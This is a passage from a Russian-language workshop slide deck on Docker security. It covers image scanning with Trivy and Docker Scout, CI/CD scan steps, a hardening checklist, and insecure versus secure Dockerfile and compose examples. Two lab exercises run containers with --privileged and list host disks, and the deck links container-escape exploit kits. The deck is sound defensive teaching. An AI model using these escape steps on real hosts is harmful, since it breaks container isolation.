# –°—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è–º–∏
docker scout recommendations nginx:latest

# –ë—ã—Å—Ç—Ä—ã–π –æ–±–∑–æ—Ä
docker scout quickview nginx:latest
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ Scout:**

- –í—Å—Ç—Ä–æ–µ–Ω –≤ Docker Desktop –∏ CLI
- –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Docker Hub
- –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—é –±–∞–∑–æ–≤—ã—Ö –æ–±—Ä–∞–∑–æ–≤
- Policy enforcement –¥–ª—è CI/CD

---

## –ü—Ä–∞–∫—Ç–∏–∫–∞: –°–∫–∞–Ω–∏—Ä—É–µ–º —É—è–∑–≤–∏–º—ã–π –æ–±—Ä–∞–∑

**–ó–∞–¥–∞–Ω–∏–µ:**

1. –°–æ–±–µ—Ä–∏—Ç–µ —Ç–µ—Å—Ç–æ–≤—ã–π –æ–±—Ä–∞–∑ —Å —É—è–∑–≤–∏–º–æ—Å—Ç—è–º–∏
2. –ü—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ –µ–≥–æ —Å –ø–æ–º–æ—â—å—é Trivy
3. –ü—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä—É–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
4. –ù–∞–π–¥–∏—Ç–µ –æ–±—Ä–∞–∑ –±–µ–∑ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π

```dockerfile
# –£—è–∑–≤–∏–º—ã–π Dockerfile
FROM ubuntu:18.04
RUN apt-get update && apt-get install -y curl
COPY app.sh /app.sh
CMD ["/app.sh"]
```

```bash
docker build -t vulnerable-app .
trivy image --severity CRITICAL,HIGH vulnerable-app
```

**–¶–µ–ª—å:** –ü–æ–Ω—è—Ç—å, –∫–∞–∫ —á–∏—Ç–∞—Ç—å –æ—Ç—á—ë—Ç Trivy –∏ –ø—Ä–∏–Ω–∏–º–∞—Ç—å —Ä–µ—à–µ–Ω–∏—è

---

## –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è –≤ CI/CD

**GitHub Actions –ø—Ä–∏–º–µ—Ä:**

```yaml
- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: "myapp:${{ github.sha }}"
    format: "sarif"
    output: "trivy-results.sarif"
    severity: "CRITICAL,HIGH"
    exit-code: "1" # Fail build –µ—Å–ª–∏ –Ω–∞–π–¥–µ–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏
```

**GitLab CI:**

```yaml
trivy_scan:
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity CRITICAL myapp:latest
```

---

## –ú–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã: –ö—Ä–∞—Ç–∫–∏–π —á–µ–∫–ª–∏—Å—Ç

**–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤:**

- –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ `--privileged` –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ
- –ú–∏–Ω–∏–º–∏–∑–∏—Ä—É–π—Ç–µ capabilities: `--cap-drop=ALL`
- –ù–µ –º–æ–Ω—Ç–∏—Ä—É–π—Ç–µ docker.sock –±–µ–∑ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ read-only —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É –≥–¥–µ –≤–æ–∑–º–æ–∂–Ω–æ

**–û–±—Ä–∞–∑—ã –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è:**

- –†–µ–≥—É–ª—è—Ä–Ω–æ —Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ –æ–±—Ä–∞–∑—ã (Trivy/Scout –≤ CI/CD)
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –±–∞–∑–æ–≤—ã–µ –æ–±—Ä–∞–∑—ã (alpine, distroless)
- –û–±–Ω–æ–≤–ª—è–π—Ç–µ Docker –∏ –æ–±—Ä–∞–∑—ã
- –ù–µ —Ö—Ä–∞–Ω–∏—Ç–µ —Å–µ–∫—Ä–µ—Ç—ã –≤ –æ–±—Ä–∞–∑–∞—Ö

**–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥:**

- Docker Bench Security –¥–ª—è –∞—É–¥–∏—Ç–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
- –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –∞–ª–µ—Ä—Ç–∏–Ω–≥ –Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å

---

## –ü–æ–ª–µ–∑–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã

**–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:**

- [CDK (Container Duck)](https://github.com/cdk-team/CDK) - –Ω–∞–±–æ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤
- [botb](https://github.com/brompwnie/botb) - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–∏—Å–∫ –ø—É—Ç–µ–π –ø–æ–±–µ–≥–∞
- Docker Bench Security - CIS benchmark –ø—Ä–æ–≤–µ—Ä–∫–∞

**–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ:**

- Trivy - —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π —Å–∫–∞–Ω–µ—Ä
- Docker Scout - –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –≤ Docker
- Grype, Snyk - –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã

---

## –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π Dockerfile: –ü–ª–æ—Ö–æ–π –ø—Ä–∏–º–µ—Ä

```dockerfile
# ‚ùå –ù–ï–ë–ï–ó–û–ü–ê–°–ù–û
FROM ubuntu:latest

# Root –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
RUN apt-get update && apt-get install -y python3 curl

# –°–µ–∫—Ä–µ—Ç—ã –≤ –æ–±—Ä–∞–∑–µ
ENV API_KEY="sk-1234567890abcdef"

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Å–µ—Ö –ø–∞–∫–µ—Ç–æ–≤
COPY requirements.txt .
RUN pip install -r requirements.txt

COPY app.py .

CMD ["python3", "app.py"]
```

**–ü—Ä–æ–±–ª–µ–º—ã:** latest —Ç–µ–≥, root, —Å–µ–∫—Ä–µ—Ç—ã –≤ ENV, –±–æ–ª—å—à–æ–π –æ–±—Ä–∞–∑

---

## –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π Dockerfile: –•–æ—Ä–æ—à–∏–π –ø—Ä–∏–º–µ—Ä

```dockerfile
# ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û
FROM python:3.11-alpine AS builder

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

# Multi-stage: –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–∑
FROM python:3.11-alpine

# Non-root –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
RUN addgroup -g 1000 appgroup && \
    adduser -D -u 1000 -G appgroup appuser

WORKDIR /app
COPY --from=builder --chown=appuser:appgroup /root/.local /home/appuser/.local
COPY --chown=appuser:appgroup app.py .

USER appuser

# Read-only filesystem
# –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: docker run --read-only --tmpfs /tmp myapp

CMD ["python3", "app.py"]
```

---

## –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π Dockerfile

–ü–æ–ø—Ä–æ–±—É–µ–º!

```
docker run -it --privileged --name ctf-task1 --user appuser:appuser ubuntu-unpriveleged-user
```

1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —É—Ç–∏–ª–∏—Ç—É –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –¥–∏—Å–∫–∞–º–∏`apt-get update` `apt-get -y install fdisk`
2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –¥–∏—Å–∫–∏: `fdisk -l`

> –£–º–µ–Ω—å—à–µ–Ω–∏–µ –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏ ‚Äî –¥–∞–∂–µ –≤–Ω—É—Ç—Ä–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –º–æ–∂–µ—Ç –º–µ–Ω—è—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ–∞–π–ª—ã, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –ø–∞–∫–µ—Ç—ã, –º–µ–Ω—è—Ç—å —Å–µ—Ç–µ–≤—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏.

---

## –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π Dockerfile: –õ—É—á—à–∏–µ –ø—Ä–∞–∫—Ç–∏–∫–∏

**–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:**

‚úÖ –ö–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —Ç–µ–≥–∏ –≤–µ—Ä—Å–∏–π (`python:3.11-alpine`, –Ω–µ `latest`)
‚úÖ –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –±–∞–∑–æ–≤—ã–µ –æ–±—Ä–∞–∑—ã (`alpine`, `distroless`)
‚úÖ Multi-stage builds –¥–ª—è —É–º–µ–Ω—å—à–µ–Ω–∏—è —Ä–∞–∑–º–µ—Ä–∞
‚úÖ Non-root –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
‚úÖ `.dockerignore` –¥–ª—è –∏—Å–∫–ª—é—á–µ–Ω–∏—è —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤

**–ò–∑–±–µ–≥–∞–π—Ç–µ:**

‚ùå `latest` —Ç–µ–≥–∞
‚ùå –ó–∞–ø—É—Å–∫–∞ –æ—Ç root
‚ùå –•—Ä–∞–Ω–µ–Ω–∏—è —Å–µ–∫—Ä–µ—Ç–æ–≤ –≤ –æ–±—Ä–∞–∑–µ (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ secrets management)
‚ùå –£—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–µ–Ω—É–∂–Ω—ã—Ö –ø–∞–∫–µ—Ç–æ–≤

---

## docker-compose.yml: –•–æ—Ä–æ—à–∏–π –ø—Ä–∏–º–µ—Ä

```yaml
# ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û
services:
  app:
    image: myapp:1.2.3 # –ö–æ–Ω–∫—Ä–µ—Ç–Ω–∞—è –≤–µ—Ä—Å–∏—è
    read_only: true # Read-only filesystem
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE # –¢–æ–ª—å–∫–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ capabilities
    security_opt:
      - no-new-privileges:true
    user: "1000:1000" # Non-root
    volumes:
      - ./data:/app/data:ro # Read-only –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ
    environment:
      - DATABASE_HOST=db
    secrets:
      - db_password # –ò—Å–ø–æ–ª—å–∑—É–µ–º Docker secrets

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

---

## cap_drop

–ü—Ä–æ–±—É–µ–º!

```
docker run -it --privileged --name ctf-task1 --user appuser:appuser --cap-add=CHOWN --cap-add=SETUID --cap-add=SETGID --cap-add=FOWNER --cap-add=DAC_OVERRIDE ubuntu-unpriveleged-user
```

1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —É—Ç–∏–ª–∏—Ç—É –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –¥–∏—Å–∫–∞–º–∏`apt-get update` `apt-get -y install fdisk`
2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –¥–∏—Å–∫–∏: `fdisk -l`

---

## docker-compose.yml: –õ—É—á—à–∏–µ –ø—Ä–∞–∫—Ç–∏–∫–∏

**Network –∏–∑–æ–ª—è—Ü–∏—è:**

```yaml
networks:
  frontend:
  backend:
    internal: true # –ë–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç
```

---

## –†–µ—Å—É—Ä—Å—ã –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –∏–∑—É—á–µ–Ω–∏—è

**–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è –∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç—ã:**

- [Docker Security Docs](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

**–ü—Ä–∞–∫—Ç–∏–∫–∞:**

- HackTheBox - Docker escape challenges
- TryHackMe - Container Security room
- [Play with Docker](https://labs.play-with-docker.com/) - –ø–µ—Å–æ—á–Ω–∏—Ü–∞

**–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã:**

- Trivy: https://github.com/aquasecurity/trivy
- Docker Bench: https://github.com/docker/docker-bench-security

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

**–ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã:**

1. –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã –Ω–µ —è–≤–ª—è—é—Ç—Å—è –±–µ–∑–æ–ø–∞—Å–Ω—ã–º–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
2. Privileged —Ä–µ–∂–∏–º –∏ docker.sock - –∫—Ä–∏—Ç–∏—á–Ω—ã–µ –≤–µ–∫—Ç–æ—Ä—ã –∞—Ç–∞–∫
3. Capabilities —Ç—Ä–µ–±—É—é—Ç —Ç—â–∞—Ç–µ–ª—å–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
4. –†–µ–≥—É–ª—è—Ä–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–∑–æ–≤ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ (Trivy/Scout)
5. Defense in depth - –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ —É—Ä–æ–≤–Ω–µ–π –∑–∞—â–∏—Ç—ã

**–í–∞–∂–Ω–æ:** –í—Å–µ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–µ–≥–∞–ª—å–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è—Ö!

---

## –°–ø–∞—Å–∏–±–æ –∑–∞ —É—á–∞—Å—Ç–∏–µ!

**–í–æ–ø—Ä–æ—Å—ã –∏ –æ–±—Å—É–∂–¥–µ–Ω–∏–µ**

–ü—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ—Å—å –±–µ–∑–æ–ø–∞—Å–Ω–æ!
